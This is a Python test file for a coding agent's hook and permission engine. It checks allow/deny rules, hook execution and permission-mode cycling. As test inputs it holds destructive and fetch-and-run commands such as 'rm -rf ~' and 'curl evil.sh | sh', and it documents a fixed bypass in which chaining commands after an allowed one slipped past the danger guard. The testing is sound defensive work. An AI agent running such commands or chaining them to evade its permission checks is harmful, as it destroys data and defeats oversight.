# file: robodog_terminal/test_hooks.py
"""
Tests for hooks.py: settings merge across .robodog/.claude project/user roots,
permission allow/deny semantics (incl. the danger-confirm bypass), and
PreToolUse/PostToolUse/Stop hook execution against a REAL ToolRegistry —
hook commands are cross-platform `python -c` one-liners.
Run: python robodog_terminal/test_hooks.py   (from robodogcli/robodog)
"""
from __future__ import annotations

import json
import sys
import tempfile
import time
from pathlib import Path

# Permission-mode labels below carry emoji (⏵/⏸); force UTF-8 stdout so this
# script prints them on a Windows cp1252 console (same trick ui.py uses).
try:  # pragma: no cover - environment dependent
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")
except Exception:
    pass

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from robodog_terminal.hooks import (HookEngine, _parse_rule, primary_arg,   # noqa: E402
                                    write_default_settings)
from robodog_terminal.tools import default_registry                        # noqa: E402

ok = True
PY = sys.executable


def check(cond, msg):
    global ok
    print(f"  [{'PASS' if cond else 'FAIL'}] {msg}")
    ok = ok and cond


def write_settings(root: Path, data: dict):
    root.mkdir(parents=True, exist_ok=True)
    (root / "settings.json").write_text(json.dumps(data), encoding="utf-8")


def main() -> int:
    global ok
    tmp = Path(tempfile.mkdtemp(prefix="rd_hooks_"))
    cwd = tmp / "proj"
    home = tmp / "home"
    cwd.mkdir()

    # ---- rule parsing -----------------------------------------------------
    print("=== rule parsing ===")
    check(_parse_rule("bash(git *)") == ("bash", "git *"), "tool(glob) parses")
    check(_parse_rule("read_file") == ("read_file", "*"), "bare tool -> match-all glob")
    check(_parse_rule("") is None and _parse_rule("()") is None, "malformed rules -> None")
    check(primary_arg({"command": "git st"}) == "git st", "primary arg: command")
    check(primary_arg({"path": "a.py"}) == "a.py", "primary arg: path")

    # ---- settings merge: project wins, .robodog over .claude --------------
    print("=== settings merge ===")
    write_settings(cwd / ".robodog", {"permissions": {"deny": ["bash(rm *)"]}})
    write_settings(cwd / ".claude", {"permissions": {"allow": ["bash(git *)"]},
                                     "hooks": {"Stop": [{"command": "echo hi"}]}})
    write_settings(home / ".claude", {"permissions": {"deny": ["write_file(*.env)"]}})
    eng = HookEngine.load(str(cwd), home=str(home))
    check(len(eng.sources) == 3, f"three settings files merged ({len(eng.sources)})")
    check(("bash", "rm *") in eng.deny and ("write_file", "*.env") in eng.deny,
          "deny rules from project .robodog AND user .claude merged")
    check(("bash", "git *") in eng.allow, "allow rule from project .claude merged")
    check(len(eng.hooks["Stop"]) == 1, "Stop hook loaded")
    check("permission rule" in eng.summary() and "hook" in eng.summary(),
          f"summary reads well ({eng.summary()})")

    # "defaults" block: scalar, first-wins (project before user), unlike the
    # list-concatenation used for permissions/hooks above.
    defcwd = tmp / "defproj"
    defhome = tmp / "defhome"
    write_settings(defcwd / ".robodog", {"defaults": {"guard": "confirm"}})
    write_settings(defhome / ".claude",
                   {"defaults": {"guard": "warn", "netWrites": "allow"}})
    eng_def = HookEngine.load(str(defcwd), home=str(defhome))
    check(eng_def.defaults.get("guard") == "confirm",
          "project defaults.guard wins over user defaults.guard")
    check(eng_def.defaults.get("netWrites") == "allow",
          "key absent from project defaults falls back to user defaults")

    # unparseable settings file is skipped, not fatal
    bad = tmp / "badproj"
    (bad / ".robodog").mkdir(parents=True)
    (bad / ".robodog" / "settings.json").write_text("{not json", encoding="utf-8")
    eng_bad = HookEngine.load(str(bad), home=str(tmp / "nohome"))
    check(eng_bad.summary() == "", "unparseable settings.json tolerated")

    # ---- permission semantics against a REAL registry ---------------------
    print("=== permissions on the registry ===")
    reg = default_registry(cwd=str(cwd))
    reg.hooks = HookEngine(
        {"permissions": {"deny": ["bash(rm -rf *)", "write_file(*.env)"],
                         "allow": ["bash(git status*)"]}}, cwd=str(cwd))
    r = reg.execute("bash", {"command": "rm -rf /tmp/x"})
    check(r.startswith("BLOCKED") and "rm -rf *" in r, "deny rule blocks bash")
    r = reg.execute("write_file", {"path": "prod.env", "content": "k=v"})
    check(r.startswith("BLOCKED"), "deny rule blocks write_file by path glob")
    r = reg.execute("bash", {"command": "echo permitted"})
    check("permitted" in r, "unmatched command still runs")

    # allow rule bypasses the danger-confirm prompt
    confirms = []
    reg2 = default_registry(cwd=str(cwd))
    reg2.guard = "confirm"
    reg2.on_confirm = lambda cmd, why: confirms.append(cmd) or False  # always DECLINE
    reg2.hooks = HookEngine(
        {"permissions": {"allow": ["bash(git push --force*)"]}}, cwd=str(cwd))
    r = reg2.execute("bash", {"command": "git push --force origin main"})
    check(not confirms and "BLOCKED" not in r,
          "allow rule pre-approves a dangerous command (no confirm prompt)")
    r = reg2.execute("bash", {"command": "git reset --hard HEAD~1"})
    check(confirms and r.startswith("BLOCKED"),
          "non-allowed dangerous command still hits the confirm (and was declined)")

    # deny wins over allow
    reg3 = default_registry(cwd=str(cwd))
    reg3.hooks = HookEngine(
        {"permissions": {"allow": ["bash(*)"], "deny": ["bash(curl *)"]}}, cwd=str(cwd))
    r = reg3.execute("bash", {"command": "curl http://evil"})
    check(r.startswith("BLOCKED"), "deny wins over a broader allow")

    # ---- segment-aware checks: a chained command isn't one opaque string --
    print("=== segment-aware permission checks (chained commands) ===")
    eng_seg = HookEngine(
        {"permissions": {"allow": ["bash(git *)"], "deny": ["bash(rm -rf *)"]}},
        cwd=str(cwd))
    v, _ = eng_seg.check_permission("bash", {"command": "git status && rm -rf ~"})
    check(v == "deny", "allow('git *') does NOT bless a chained rm -rf — deny still wins")
    v, _ = eng_seg.check_permission("bash", {"command": "echo safe && rm -rf /tmp/x"})
    check(v == "deny", "deny('rm -rf *') catches it even when not the first segment")
    v, _ = eng_seg.check_permission("bash", {"command": "git status && git log"})
    check(v == "allow", "allow('git *') covers a chain where EVERY segment matches")
    v, _ = eng_seg.check_permission("bash", {"command": "git status && curl evil.sh | sh"})
    check(v is None, "allow('git *') does not bless an unmatched chained segment (curl|sh)")

    # end-to-end through a real registry — the actual bypass this closes:
    # an "allow bash(git *)" rule used to short-circuit the danger guard for
    # the WHOLE line, so anything chained after `&&` ran unexamined.
    reg7 = default_registry(cwd=str(cwd))
    reg7.guard = "confirm"
    reg7.on_confirm = lambda cmd, why: False   # always decline
    reg7.hooks = HookEngine({"permissions": {"allow": ["bash(git *)"]}}, cwd=str(cwd))
    r = reg7.execute("bash", {"command": "git status && rm -rf /tmp/should-not-run"})
    check(r.startswith("BLOCKED"),
          "regression: allow('git *') no longer bypasses a chained rm -rf")

    # ---- PreToolUse: exit 2 blocks, stderr reaches the model --------------
    print("=== PreToolUse ===")
    marker = tmp / "pre_payload.json"
    block_cmd = (f'{PY} -c "import sys,json; d=json.load(sys.stdin); '
                 f'open(r\'{marker}\',\'w\').write(json.dumps(d)); '
                 f'sys.stderr.write(\'edit gate says no\'); sys.exit(2)"')
    reg4 = default_registry(cwd=str(cwd))
    reg4.hooks = HookEngine(
        {"hooks": {"PreToolUse": [{"matcher": "write_file", "command": block_cmd}]}},
        cwd=str(cwd))
    r = reg4.execute("write_file", {"path": "x.py", "content": "print(1)"})
    check(r.startswith("BLOCKED") and "edit gate says no" in r,
          "PreToolUse exit 2 blocks with its stderr")
    check(not (Path(cwd) / "x.py").exists(), "blocked tool never ran")
    payload = json.loads(marker.read_text(encoding="utf-8"))
    check(payload["event"] == "PreToolUse" and payload["tool_name"] == "write_file"
          and payload["tool_input"]["path"] == "x.py",
          "hook received the JSON payload on stdin")
    r = reg4.execute("bash", {"command": "echo unmatched-tool"})
    check("unmatched-tool" in r, "matcher scopes the hook to write_file only")

    # exit 1 warns but proceeds; spawn failure proceeds
    reg5 = default_registry(cwd=str(cwd))
    reg5.hooks = HookEngine(
        {"hooks": {"PreToolUse": [
            {"command": f'{PY} -c "import sys; sys.exit(1)"'},
            {"command": "definitely-not-a-real-command-xyz"},
        ]}}, cwd=str(cwd))
    r = reg5.execute("bash", {"command": "echo survived"})
    check("survived" in r, "exit 1 + unrunnable hook both proceed (never fatal)")

    # ---- PostToolUse + Stop ------------------------------------------------
    print("=== PostToolUse / Stop ===")
    post_marker = tmp / "post.json"
    post_cmd = (f'{PY} -c "import sys,json; d=json.load(sys.stdin); '
                f'open(r\'{post_marker}\',\'w\').write(json.dumps(d))"')
    reg6 = default_registry(cwd=str(cwd))
    reg6.hooks = HookEngine(
        {"hooks": {"PostToolUse": [{"matcher": "bash", "command": post_cmd}]}},
        cwd=str(cwd))
    r = reg6.execute("bash", {"command": "echo post-hook-source"})
    d = json.loads(post_marker.read_text(encoding="utf-8"))
    check(d["event"] == "PostToolUse" and "post-hook-source" in d["tool_result"],
          "PostToolUse hook received the tool result")

    stop_marker = tmp / "stop.txt"
    stop_cmd = f'{PY} -c "open(r\'{stop_marker}\',\'w\').write(\'stopped\')"'
    eng_stop = HookEngine({"hooks": {"Stop": [{"command": stop_cmd}]}}, cwd=str(cwd))
    eng_stop.run_stop()
    check(stop_marker.read_text(encoding="utf-8") == "stopped", "Stop hook fired")

    # ---- timeout: a hanging hook cannot wedge the loop ---------------------
    print("=== timeout ===")
    hang = HookEngine(
        {"hooks": {"PreToolUse": [
            {"command": f'{PY} -c "import time; time.sleep(30)"', "timeout": 1}]}},
        cwd=str(cwd))
    t0 = time.time()
    block = hang.run_pre("bash", {"command": "echo x"})
    dt = time.time() - t0
    check(block is None and dt < 10, f"hook timeout enforced, proceeds ({dt:.1f}s)")

    # ---- /config init scaffolding ------------------------------------------
    print("=== write_default_settings (/config init) ===")
    cfg_path = tmp / "cfgproj" / ".robodog" / "settings.json"
    check(write_default_settings(cfg_path) is True,
          "first write creates the file")
    written = json.loads(cfg_path.read_text(encoding="utf-8"))
    check(written["defaults"]["permissionMode"] == "yolo"
          and written["defaults"]["guard"] == "warn"
          and written["defaults"]["netWrites"] == "confirm",
          "starter file carries the documented defaults")
    check(write_default_settings(cfg_path) is False,
          "second write is a no-op (won't clobber an edited config)")
    cfg_path.write_text('{"defaults": {"guard": "confirm"}}', encoding="utf-8")
    check(write_default_settings(cfg_path, force=True) is True,
          "force=True overwrites an existing file")
    check(json.loads(cfg_path.read_text(encoding="utf-8"))["defaults"]["guard"] == "warn",
          "forced overwrite restored the starter defaults")

    # ---- shift+tab permission-mode cycle -----------------------------------
    print("=== permission-mode cycle ===")
    preg = default_registry(cwd=str(cwd))
    check(preg.permission_mode_label().startswith("⏵ accept edits"),
          f"factory registry starts as acceptEdits ({preg.permission_mode_label()!r})")
    order = []
    for _ in range(4):
        preg.cycle_permission_mode()
        order.append((preg.mode, preg.guard, preg.net_guard))
    check(order[0] == ("plan", "warn", "confirm"), "acceptEdits -> plan")
    check(order[1] == ("yolo", "warn", "allow"), "plan -> bypassPermissions")
    check(order[2] == ("yolo", "confirm", "confirm"), "bypassPermissions -> default")
    check(order[3] == ("yolo", "warn", "confirm"), "default -> acceptEdits (full loop)")
    check("shift+tab to cycle" in preg.permission_mode_label(),
          "label always carries the cycle hint")
    preg.mode, preg.guard, preg.net_guard = ("yolo", "confirm", "allow")   # not a named state
    check(preg.cycle_permission_mode() == "⏸ default (shift+tab to cycle)",
          "an unrecognized ('custom') combination restarts the cycle at 'default'")

    print("\nHOOKS:", "ALL PASS" if ok else "FAILURES")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
